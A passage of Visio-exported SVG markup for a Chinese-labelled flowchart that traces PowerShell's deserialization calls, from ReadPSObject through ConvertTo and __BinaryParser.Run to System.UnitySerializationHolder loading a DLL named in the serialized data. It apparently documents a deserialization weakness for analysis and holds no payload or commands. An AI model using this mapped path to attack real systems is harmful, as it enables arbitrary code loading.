id="shape11-50" v:mID="11" v:groupContext="shape" v:layerMember="0" transform="translate(109.268,-770.416)"><title>流程.11</title><desc>ReadPSObject 读取一个Obj对象</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="26.7" y="1326.89" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ReadPSObject<v:newlineChar/><tspan x="21.23" dy="1.275em" class="st4" v:langID="2052">读取一个</tspan><tspan class="st5" v:langID="2052">Obj</tspan><tspan class="st4" v:langID="2052">对象</tspan></text></g><g id="shape14-56" v:mID="14" v:groupContext="shape" v:layerMember="1" transform="translate(155.542,-770.416)"><title>动态连接线.14</title><desc>碰到Props标签调用读取Props标签 if (this.IsNextElement("Props")){ this.R...</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="8.87798" cy="1402.16" width="146.29" height="37.6064"/><path d="M5.3 1360.63 L5.3 1381.89 L8.88 1381.89 L8.88 1441.23" class="st6"/><rect v:rectContext="textBkgnd" x="-59.1685" y="1387.36" width="136.093" height="29.6027" class="st8"/><text x="-59.17" y="1395.16" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>碰到<tspan class="st10">Props</tspan>标签，调用，读取<tspan class="st10">Props</tspan>标签<v:newlineChar/><tspan x="-46.06" dy="1.225em" class="st10" v:langID="1033">if</tspan><tspan class="st10" v:langID="1033">(</tspan><tspan class="st10" v:langID="1033">this</tspan><tspan class="st10" v:langID="1033">.</tspan><tspan class="st10" v:langID="1033">IsNextElement</tspan><tspan class="st10" v:langID="1033">("</tspan><tspan class="st10" v:langID="1033">Props</tspan><tspan class="st10" v:langID="1033">"))</tspan><tspan class="st10" v:langID="1033">{<v:newlineChar/></tspan><tspan x="-44.57" dy="1.2em" class="st10" v:langID="1033">this</tspan><tspan class="st10" v:langID="1033">.</tspan><tspan class="st10" v:langID="1033">ReadProperties</tspan><tspan class="st10" v:langID="1033">(</tspan><tspan class="st10" v:langID="1033">psobject</tspan><tspan class="st10" v:langID="1033">)</tspan><tspan class="st10" v:langID="1033">;}</tspan></text></g><g id="shape13-81" v:mID="13" v:groupContext="shape" v:layerMember="0" transform="translate(112.85,-621.896)"><title>流程.13</title><desc>ReadProperties</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="24.77" y="1332.09" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ReadProperties</text></g><g id="shape16-84" v:mID="16" v:groupContext="shape" v:layerMember="1" transform="translate(215.989,-652.838)"><title>动态连接线.16</title><desc>调用读取嵌套对象</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="157.092" cy="1170.55" width="82.2" height="28.0064"/><path d="M0 1360.63 L33.36 1360.63 A3 3 0 0 1 39.36 1360.63 L89.19 1360.63 A3 3 0 0 1 95.19 1360.63 L155.67 1360.63 L155.67         953.07 L170.89 953.07" class="st6"/><rect v:rectContext="textBkgnd" x="121.092" y="1160.55" width="71.9997" height="20.0025" class="st8"/><text x="121.09" y="1168.35" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>调用，读取嵌套对象<v:newlineChar/></text></g><g id="shape15-91" v:mID="15" v:groupContext="shape" v:layerMember="0" transform="translate(392.924,-1029.46)"><title>流程.15</title><desc>ReadOneObject</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="23.69" y="1332.09" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ReadOneObject</text></g><g id="shape20-94" v:mID="20" v:groupContext="shape" v:layerMember="1" transform="translate(441.932,-1029.46)"><title>动态连接线.20</title><desc>调用将反序列化数据 转换为目标类型此时目标类型为System.Exception</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="11.6116" cy="1400.52" width="191.4" height="38.4093"/><path d="M2.56 1360.63 L2.56 1381.89 L11.61 1381.89 L11.61 1443.42" class="st6"/><rect v:rectContext="textBkgnd" x="-78.9875" y="1385.32" width="181.198" height="30.4055" class="st8"/><text x="-28.39" y="1393.12" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>调用，将反序列化数据<v:newlineChar/><tspan x="-78.99" dy="1.3em" class="st5">转换为目标类型</tspan>，此时目标类型为<tspan class="st10">System</tspan><tspan class="st10">.</tspan><tspan class="st10">Exception</tspan><v:newlineChar/></text></g><g id="shape19-105" v:mID="19" v:groupContext="shape" v:layerMember="0" transform="translate(401.974,-878.74)"><title>流程.19</title><desc>ConvertTo</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="33.29" y="1332.09" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ConvertTo</text></g><g id="shape22-108" v:mID="22" v:groupContext="shape" v:layerMember="1" transform="translate(505.113,-909.682)"><title>动态连接线.22</title><desc>一系列调用</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="119.807" cy="1360.63" width="50.2" height="18.4064"/><path d="M0 1360.63 L151.98 1360.63 L151.98 1442.22" class="st6"/><rect v:rectContext="textBkgnd" x="99.807" y="1355.43" width="39.9998" height="10.403" class="st8"/><text x="99.81" y="1363.23" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>一系列调用</text></g><g id="shape21-115" v:mID="21" v:groupContext="shape" v:layerMember="0" transform="translate(605.522,-760.164)"><title>流程.21</title><desc>Object.Reader.Deserialize</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="6.93" y="1332.09" class="st3" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>Object.Reader.<tspan class="st5" v:langID="1033">Deserialize</tspan></text></g><g id="shape24-119" v:mID="24" v:groupContext="shape" v:layerMember="1" transform="translate(661.617,-760.164)"><title>动态连接线.24</title><desc>调用解析内存中的序列化数据</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="-9.64826" cy="1403.78" width="122.2" height="18.4064"/><path d="M-4.52 1360.63 L-4.52 1381.89 L-9.65 1381.89 L-9.65 1446.02" class="st6"/><rect v:rectContext="textBkgnd" x="-65.6479" y="1398.58" width="112" height="10.403" class="st8"/><text x="-65.65" y="1406.38" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>调用，解析内存中的序列化数据</text></g><g id="shape23-126" v:mID="23" v:groupContext="shape" v:layerMember="0" transform="translate(600.399,-606.854)"><title>流程.23</title><desc>__BinaryParser.Run</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="18.73" y="1332.09" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>__BinaryParser<tspan class="st5" v:langID="2052">.</tspan><tspan class="st5" v:langID="2052">Run</tspan></text></g><g id="shape28-131" v:mID="28" v:groupContext="shape" v:layerMember="1" transform="translate(647.444,-606.854)"><title>动态连接线.28</title><path d="M4.52 1360.63 L4.52 1381.89 L9.65 1381.89 L9.65 1408.69" class="st6"/></g><g id="shape27-136" v:mID="27" v:groupContext="shape" v:layerMember="0" transform="translate(605.522,-445.491)"><title>流程.27</title><desc>将序列化数据解析为System.UnitySerializationHolder对象并载入m_assmblyName对应的...</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.62992125984252):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1307" width="103.14" height="107.265"/><rect x="0" y="1253.37" width="103.139" height="107.265" class="st2"/><text x="15.57" y="1294.19" class="st11" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>将序列化数据解析为<tspan x="2.27" dy="1.2em" class="st10" v:langID="1033">System</tspan><tspan class="st10" v:langID="1033">.</tspan><tspan class="st10" v:langID="1033">UnitySerializationHo</tspan><tspan x="20.76" dy="1.275em" class="st10" v:langID="1033">lder</tspan>对象，并载入<tspan x="3.2" dy="1.3em" class="st10">m</tspan><tspan class="st10">_</tspan><tspan class="st10">assmblyName</tspan>对应的<tspan class="st10">DLL</tspan></text></g><g id="shape39-147" v:mID="39" v:groupContext="shape" v:layerMember="1" transform="translate(450.982,-878.74)"><title>动态连接线.39</title><path d="M2.56 1360.63 L2.56 1381.89 L11.61 1381.89 L11.61 1427.98" class="st6"/></g><g id="shape38-152" v:mID="38" v:groupContext="shape" v:layerMember="0" transform="translate(411.024,-722.835)"><title>流程.38</title><desc>转化为在m_assmblyName对应的DLL中的m_data对应类型的Type对象</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1319.37" width="103.14" height="82.5114"/><rect x="0" y="1278.12" width="103.139" height="82.5114" class="st2"/><text x="5.77" y="1311.57" class="st11" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>转化为在<tspan class="st10">m</tspan><tspan class="st10">_</tspan><tspan class="st10">assmblyName</tspan><tspan x="4.11" dy="1.3em" class="st5">对应的</tspan><tspan class="st10">DLL</tspan>中的<tspan class="st10">m</tspan><tspan class="st10">_</tspan><tspan class="st10">data</tspan>对应<tspan x="23.1" dy="1.3em" class="st5">类型的</tspan><tspan class="st10">Type</tspan>对象</text></g><g id="shape41-165" v:mID="41" v:groupContext="shape" v:layerMember="1" transform="translate(462.593,-722.835)"><title>动态连接线.41</title><desc>一系列返回</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="-98.6173" cy="1482.83" width="50.2" height="18.4064"/><path d="M0 1360.63 L0 1482.83 L-151.41 1482.83 A3 3 -180 0 0 -157.41 1482.83 L-207.24 1482.83 A3 3 -180 0 0 -213.24         1482.83 L-298.17 1482.83 L-298.17 1467.61" class="st6"/><rect v:rectContext="textBkgnd" x="-118.617" y="1477.63" width="39.9998" height="10.403" class="st8"/><text x="-118.62" y="1485.43" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>一系列返回</text></g><g id="shape43-172" v:mID="43" v:groupContext="shape" v:layerMember="1" transform="translate(112.85,-652.838)"><title>动态连接线.43</title><path d="M0 1360.63 L-21.26 1360.63 L-21.26 1477.58 L45.38 1477.58 L45.38 1492.8" class="st6"/></g><g id="shape42-177" v:mID="42" v:groupContext="shape" v:layerMember="0" transform="translate(106.662,-452.748)"><title>流程.42</title><desc>将ConverTo返回的Type对象加入.adaptedMembers</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="2.17" y="1327.09" class="st11" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>将<tspan class="st10">ConverTo</tspan>返回的<tspan class="st10">Type</tspan>对象<tspan x="11.46" dy="1.3em" class="st5">加入</tspan><tspan class="st10" v:langID="1033">.</tspan><tspan class="st10" v:langID="1033">adaptedMembers</tspan></text></g><g id="shape45-185" v:mID="45" v:groupContext="shape" v:layerMember="0" transform="translate(107.205,-312.478)"><title>流程.45</title><desc>GetTargetTypeForDeserialization</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="3.07" y="1327.29" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>GetTargetTypeForDeserializ<tspan x="42.6" dy="1.2em" class="st5">ation</tspan></text></g><g id="shape53-189" v:mID="53" v:groupContext="shape" v:layerMember="0" transform="translate(108.725,-1141.72)"><title>流程.53</title><desc>ReadOneDeserializedObject</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" 